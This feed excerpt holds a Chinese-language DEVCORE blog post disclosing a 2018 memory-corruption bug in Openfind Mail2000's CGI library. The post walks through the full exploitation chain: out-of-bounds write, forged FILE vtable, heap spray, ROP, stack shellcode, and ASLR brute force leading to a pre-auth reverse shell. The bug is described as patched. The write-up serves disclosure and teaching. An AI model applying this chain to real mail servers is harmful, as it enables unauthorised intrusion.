                <description>&lt;p&gt;郵件系統作為大部分企業主要的資訊交換方式，在戰略上佔有了舉足輕重的地位。掌控了郵件伺服器不僅可以竊聽郵件的內容，甚至許多重要文件都可以在郵件系統中找到，使得駭客能夠更進一步的滲透。本篇文章將介紹研究組在 Openfind Mail2000 這套軟體上發現的記憶體漏洞，以及利用這個漏洞的攻擊手法。
&lt;strong&gt;此漏洞為 2018 年時發現，當時已通報 Openfind 並且迅速被修補，同時也已協助相關用戶進行更新。&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;openfind-mail2000&quot;&gt;Openfind Mail2000&lt;/h2&gt;
&lt;p&gt;Mail2000 是一套由台灣廠商 Openfind 所開發，簡單易用的電子郵件系統，被廣泛使用於台灣的公家機關、教育機構，如台北市教育局、中科院，以及臺灣科技大學都有使用 Mail2000 作為主要的郵件伺服器。常見的入口介面如下：
&lt;img src=&quot;/assets/img/blog/20191223/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這次的漏洞，便是從這個 Web 介面，利用 Binary 的手法，攻陷整台伺服器！&lt;/p&gt;

&lt;h2 id=&quot;伺服器架構&quot;&gt;伺服器架構&lt;/h2&gt;
&lt;p&gt;Mail2000 提供了 Web 介面供管理員以及使用者操作，也就是所謂的 Webmail，而此處 Openfind 使用了 CGI (Common Gateway Interface) 的技術來實作。大多數 Web 伺服器實現 CGI 的方式如圖：
&lt;img src=&quot;/assets/img/blog/20191223/2.png&quot; alt=&quot;&quot; /&gt;
首先由 httpd 接受客戶端的請求後，根據對應的 CGI 路徑，執行相對應的 CGI 檔案。而大多數的開發者會根據需求，將常見的共用 function 撰寫成 library，供 CGI 呼叫。
往底層來看，其實可以發現，雖然稱為 Web 伺服器，仍有許多元件是建構於 binary 之上的！例如 httpd，為了效能，多是由 C/C++ 所撰寫，而其它像是 library、擴充的 module、各頁面的 CGI 也常是如此。因此，binary 相關的漏洞，便是我們這次的攻擊目標！&lt;/p&gt;

&lt;h2 id=&quot;漏洞&quot;&gt;漏洞&lt;/h2&gt;

&lt;p&gt;這個漏洞位於 Openfind 實作的 library &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libm2kc&lt;/code&gt; 中，此函式庫包含了各種 CGI 通用函式，如參數解析及檔案處理等等，而這個漏洞就發生在參數解析的部分。由於參數處理是很底層且基本的功能，因此影響的範圍非常的大，就連 Openfind 的其它產品也同樣受影響！
這個漏洞的觸發條件如下：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;攻擊者使用 multipart 形式發送 HTTP POST 請求&lt;/li&gt;
  &lt;li&gt;POST 傳送的資料內容超過 200 項&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;multipart 是 HTTP 協定中，用來處理多項檔案傳輸時的一種格式，舉例如下：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type: multipart/form-data; boundary=AaB03x   

 --AaB03x 
Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot; 
Content-Type: text/plain 

 ... contents of file1.txt ...
 --AaB03x--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而在 libm2kc 中，使用了陣列來儲存參數：&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;這個陣列為全域變數 g_stCGIEnv 中的 param，在存入 param 陣列時，並沒有檢查是否已超過宣告的陣列大小，就造成了越界寫入。
&lt;img src=&quot;/assets/img/blog/20191223/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;需要注意的是，param 陣列所儲存的結構為指向字串位置的指標，而非字串本身&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;因此當觸發越界寫入時，寫入記憶體的值也是一個個指向字串的指標，而被指向的字串內容則是造成溢出的參數。
&lt;img src=&quot;/assets/img/blog/20191223/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;漏洞利用&quot;&gt;漏洞利用&lt;/h2&gt;

&lt;p&gt;要利用越界寫入的漏洞，就要先了解利用這個溢出可以做到什麼，發生溢出的全域變數結構如下：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 CGIEnv          struc ; (sizeof=0x6990, mappedto_95)
00000000 buf             dd ?                    ; offset
00000004 length          dd ?
00000008 field_8         dd 6144 dup(?)          ; offset
00006008 param_arr       param 200 dup(?)
00006968 file_vec        dd ?                    ; offset
0000696C vec_len         dd ?
00006970 vec_cur_len     dd ?
00006974 arg_cnt         dd ?
00006978 field_6978      dd ?
0000697C errcode         dd ?
00006980 method          dd ?
00006984 is_multipart    dd ?
00006988 read_func       dd ?
0000698C field_698C      dd ?
00006990 CGIEnv          ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;溢出的陣列為其中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param_arr&lt;/code&gt;，因此在其之後的變數皆可能被覆寫。包括&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;post_files&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vec_len&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vec_cur_len&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arg_cnt&lt;/code&gt; … 等等。其中最吸引我注意的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;這個變數，這是一個用來管理 POST 上傳檔案的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt;，大部分的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; 結構像是這樣：
&lt;img src=&quot;/assets/img/blog/20191223/5.png&quot; alt=&quot;&quot; /&gt;
使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size&lt;/code&gt; 記錄陣列的總長度，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;end&lt;/code&gt; 記錄目前用到哪裡，這樣就可以在容量不夠的時候進行擴充。我們若利用漏洞，使溢出的指標覆蓋 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; 的指標，就有可能有效的利用！藉由覆蓋這個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; 指標，我們可以達到偽造一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST file&lt;/code&gt;，及其中所有相關變數的效果，而這個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST file&lt;/code&gt; 結構裡面就包含了各種常見的檔案相關變數，像是路徑、檔名，和 Linux 中用來管理檔案的 &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt; 結構&lt;/strong&gt;，而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt; 結構便是這次的攻擊的關鍵！&lt;/p&gt;

&lt;h3 id=&quot;file-structure-exploit&quot;&gt;FILE Structure Exploit&lt;/h3&gt;

&lt;p&gt;這次的攻擊使用了 FILE structure exploit 的手法，是近幾年較新發現的攻擊手法，由 angelboy 在 HITCON CMT 公開&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;sup&gt;[1]&lt;/sup&gt;&lt;/a&gt;：
&lt;img src=&quot;/assets/img/blog/20191223/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;FILE 結構是 Linux 中用來做檔案處理的結構，像是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDIN&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;，或者是呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt; 後回傳的結構都是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt;。而這個結構之所以能成為漏洞利用的突破口主要原因就是它所包含的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; 指標：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_FILE_plus&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vtable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; 當中記錄了各種 function pointer，對應各種檔案處理相關的功能：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_finish_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__finish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_read_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_write_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_seek_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__seek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_close_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;因此如果我們可以篡改、偽造這個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; 的話，就可以在程式做檔案處理的時候，劫持程式流程！我們可以以此訂出以下的攻擊步驟：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;建立連線，呼叫 CGI&lt;/li&gt;
  &lt;li&gt;使用大量參數，覆寫 vector 指標&lt;/li&gt;
  &lt;li&gt;偽造 POST file 當中的 FILE*，指向一塊偽造的 FILE 結構&lt;/li&gt;
  &lt;li&gt;在 CGI 流程中呼叫 FILE 相關的操作
    &lt;ul&gt;
      &lt;li&gt;fread, fwrite, fclose, …&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;劫持程式流程&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;我們現在已經知道終點是&lt;strong&gt;呼叫一個 FILE 操作&lt;/strong&gt;，那麼就可以開始往回找&lt;strong&gt;哪個 function&lt;/strong&gt; 是 CGI 常用的 FILE 操作，又有&lt;strong&gt;哪一些 CGI&lt;/strong&gt; 可以作為入口點，才能串出我們的攻擊鏈！我們首先對使用到 POST file 的相關函式做研究，並選定了目標 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt;。
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; 在許多用到 FILE 的 CGI 中有被呼叫，它用於在程式結束前將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;g_stCGIEnv&lt;/code&gt; 清空，包括將動態配置的記憶體 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; 掉，以及將所有 FILE 關閉，也就是呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fclose()&lt;/code&gt;，也意味著是可以通過 vtable 被劫持的！我們可以使用這個越界寫入漏洞蓋掉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;，而指向的內容就是 HTTP request 的參數，便可以偽造為 POST files！像是下面這個結構：
&lt;img src=&quot;/assets/img/blog/20191223/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們的最終目標就是將 FILE* 指向偽造的結構，藉由偽造的 vtable 劫持程式流程！這時候便出現了一個問題，我們需要將 FILE* 這個指標指向一個內容可控的位置，但是其實我們並不知道該指到哪裡去，會有這個問題是起因於 Linux 上的一個防禦機制 - ASLR。&lt;/p&gt;

&lt;h3 id=&quot;address-space-layout-randomization-aslr&quot;&gt;Address Space Layout Randomization (ASLR)&lt;/h3&gt;

&lt;p&gt;ASLR 使得每次程式在執行並載入記憶體時，會隨機載入至不同的記憶體位置，我們可以嘗試使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /proc/self/maps&lt;/code&gt; 觀察每一次執行時的記憶體位置是否相同：
&lt;img src=&quot;/assets/img/blog/20191223/8.png&quot; alt=&quot;&quot; /&gt;
ASLR 在大部分的環境中都是預設開啟的，因此在撰寫 exploit 時，常遇到可以偽造指標，卻不知道該指到哪裡的窘境。
而這個機制在 CGI 的架構下會造成更大的阻礙，一般的伺服器的攻擊流程可能是這樣：
&lt;img src=&quot;/assets/img/blog/20191223/9.png&quot; alt=&quot;&quot; /&gt;
可以在一個連線當中 leak address 並用來做進一步的攻擊，但在 CGI 架構中卻是這樣：
&lt;img src=&quot;/assets/img/blog/20191223/10.png&quot; alt=&quot;&quot; /&gt;
在這個情況下，leak 得到的 address 是無法在後續攻擊中使用的！因為 CGI 執行完就結束了，下一個 request 又是全新的 CGI！
為了應對這個問題，我們最後寫了兩個 exploit，攻擊的手法根據 CGI binary 而有不同。&lt;/p&gt;

&lt;h3 id=&quot;post-auth-rce---cgi-binmsg_read&quot;&gt;Post-Auth RCE - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/msg_read&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;第一個 exploit 的入口點是一個需要登入的頁面，這一隻程式較大、功能也較多。在這一個 exploit 中，我們使用了 heap spray 的手法來克服 ASLR，也就是在 heap 中填入大量重複的物件，如此一來我們就有很高的機率可以&lt;strong&gt;猜&lt;/strong&gt;到它的位置。
&lt;img src=&quot;/assets/img/blog/20191223/11.png&quot; alt=&quot;&quot; /&gt;
而 spray 的內容就是大量偽造好的 FILE 結構，包含偽造的 vtable。從這隻 binary 中，我們找到了一個十分實用的 &lt;strong&gt;gadget&lt;/strong&gt;，也就是小程式片段：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xchg eax, esp; ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;這個 gadget 的作用在於，我們可以&lt;strong&gt;改變 stack 的位置&lt;/strong&gt;，而剛好此時的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; 指向內容是可控的，因此整個 stack 的內容都可以偽造，也就是說我們可以使用 ROP(Return-oriented programming) 來做利用！於是我們在偽造的 vtable 中設置了 stack 搬移的 gadget 以及後續利用的 ROP 攻擊鏈，進行 ROP 攻擊！
&lt;img src=&quot;/assets/img/blog/20191223/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們可以做 ROP，也就可以拿 shell 了對吧！你以為是這樣嗎？不，其實還有一個大問題，同樣導因於前面提到的防禦機制 ASLR – 我們沒有 system 的位置！這隻 binary 本身提供的 gadget 並不足以開啟一個 shell，因此我們希望可以直接利用 libc 當中的 system 來達成目的，但正如前面所提到的，記憶體位置每次載入都是隨機化的，我們並不知道 system 的確切位置！
經過我們仔細的觀察這支程式以後，我們發現了一件非常特別的事，這隻程式理論上是有打開 NX，也就是可寫段不可執行的保護機制
&lt;img src=&quot;/assets/img/blog/20191223/13.png&quot; alt=&quot;&quot; /&gt;
但是實際執行的時候，stack 的執行權限卻會被打開！
&lt;img src=&quot;/assets/img/blog/20191223/14.png&quot; alt=&quot;&quot; /&gt;
不論原因為何，這個設置對駭客來說是非常方便的，我們可以利用這個可執行段，將 shellcode 放上去執行，就可以成功得到 shell，達成 RCE！&lt;/p&gt;

&lt;p&gt;然而，這個攻擊是需要登入的，對於追求完美的 DEVCORE 研究組來說，並不足夠！因此我們更進一步的研究了其它攻擊路徑！&lt;/p&gt;

&lt;h3 id=&quot;pre-auth-rce---cgi-bincgi_api&quot;&gt;Pre-Auth RCE - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;在搜索了所有 CGI 入口點以後，我們找到了一個不需要登入，同時又會呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; 的 CGI – &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;。一如其名，它就是一隻呼叫 API 的接口，因此程式本身非常的小，幾乎是呼叫完 library 就結束了，也因此不再有 stack pivot 的 gadget 可以利用。
這時，由於我們已經得知 stack 是可執行的，因此其實我們是可以跳過 ROP 這個步驟，直接將 shellcode 放置在 stack 上的，這裡利用到一個 CGI 的特性 – HTTP 的相關變數會放在環境變數中，像是下列這些常見變數：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;HTTP_HOST&lt;/li&gt;
  &lt;li&gt;REQUEST_METHOD&lt;/li&gt;
  &lt;li&gt;QUERY_STRING&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而環境變數事實上就是被放置在 stack 的最末端，也就是可執行段的位置，因此我們只要偽造 vtable 直接呼叫 shellcode 就可以了！
&lt;img src=&quot;/assets/img/blog/20191223/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;當然這時候同樣出現了一個問題：我們仍舊沒有 stack 的記憶體位置。這個時候有些人可能會陷入一個迷思，覺得攻擊就是要一次到位，像個狙擊手一樣一擊必殺，但實際上可能是這樣拿機關槍把敵人炸飛：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191223/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;換個角度思考，這隻 binary 是 32 bits 的，因此這個位置有 1.5bytes 是隨機的，總共有 16&lt;sup&gt;3&lt;/sup&gt; 個可能的組合，所以其實平均只要 4096 次請求就可以撞到一次！這對於現在的電腦、網路速度來說其實也就是幾分鐘之間的事情，因此直接做暴力破解也是可行的！於是我們最終的 exploit 流程就是：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;發送 POST 請求至 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;QUERY_STRING 中放入 shellcode&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;觸發越界寫入，覆蓋 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;在越界的參數準備偽造的 FILE &amp;amp; vtable&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt; 結束前呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;跳至 vtable 上的 shellcode 位置，建立 reverse shell&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;最後我們成功寫出了不用認證的 RCE 攻擊鏈，並且這個 exploit 是不會因為 binary 的版本不同而受影響的！而在實際遇到的案例中也證明了這個 exploit 的可行性，我們曾在一次的演練當中，藉由 Mail2000 的這個 1day 作為突破口，成功洩漏目標的 VPN 資料，進一步往內網滲透！&lt;/p&gt;

&lt;h2 id=&quot;漏洞修復&quot;&gt;漏洞修復&lt;/h2&gt;

&lt;p&gt;此漏洞已在 2018/05/08 發布的 Mail2000 V7 Patch 050 版本中完成修復。Patch 編號為 OF-ISAC-18-002、OF-ISAC-18-003。&lt;/p&gt;

&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;

&lt;p&gt;最後想來談談對於這些漏洞，廠商該用什麼樣的心態去面對。作為一個提供產品的廠商，Openfind 在這一次的漏洞處理中有幾個關鍵值得學習：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;心態開放
    &lt;ul&gt;
      &lt;li&gt;主動提供測試環境&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;積極修復漏洞
    &lt;ul&gt;
      &lt;li&gt;面對漏洞以積極正向的態度，迅速處理&lt;/li&gt;
      &lt;li&gt;修復完畢後，與提報者合作驗證&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;重視客戶安全
    &lt;ul&gt;
      &lt;li&gt;發布重大更新並主動通報客戶、協助更新&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其實產品有漏洞是很正常也很難避免的事，而我們研究組是作為一個協助者的角色，期望能藉由回報漏洞幫助企業，提高資安意識並增進台灣的資安水平！希望廠商們也能以正向的態度來面對漏洞，而不是閃躲逃避，這樣只會令用戶們陷入更大的資安風險當中！&lt;/p&gt;

&lt;p&gt;而對於使用各項設備的用戶，也應當掌握好屬於自己的資產，防火牆、伺服器等產品並不是購買來架設好以後就沒有問題了，做好資產盤點、追蹤廠商的安全性更新，才能確保產品不受到 1day 的攻擊！而定期進行滲透測試以及紅隊演練，更是可以幫助企業釐清自己是否有盲點、缺失，進而改善以降低企業資安風險。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world/</link>
                <guid>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world</guid>
                <pubDate>Mon, 23 Dec 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>你用它上網，我用它進你內網! 中華電信數據機遠端代碼執行漏洞</title>
                <description>&lt;p&gt;大家好，我是 Orange! 這次的文章，是我在 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; 上所分享的議題，講述如何從中華電信的一個設定疏失，到串出可以掌控數十萬、甚至數百萬台的家用數據機漏洞!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;身為 DEVCORE 的研究團隊，我們的工作就是研究最新的攻擊趨勢、挖掘最新的弱點、找出可以影響整個世界的漏洞，回報給廠商避免這些漏洞流至地下黑市被黑帽駭客甚至國家級駭客組織利用，讓這個世界變得更加安全!&lt;/p&gt;

